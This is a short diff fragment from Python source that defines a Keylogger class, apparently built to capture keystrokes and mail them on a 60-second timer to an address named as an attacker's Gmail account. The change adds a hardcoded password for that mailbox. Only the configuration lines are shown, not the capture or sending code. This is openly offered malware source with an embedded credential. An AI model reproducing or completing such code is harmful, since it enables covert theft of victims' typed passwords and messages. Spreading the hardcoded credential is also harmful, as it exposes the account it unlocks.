@@ -6,7 +6,7 @@ from threading import Timer
 from datetime import datetime
 INTERVAL = 60
 EMAIL_ADDRESS= "fsattacker247@gmail.com"
-EMAIL_PASSWORD =""
+EMAIL_PASSWORD ="FS123456789"
 
 
 class Keylogger:
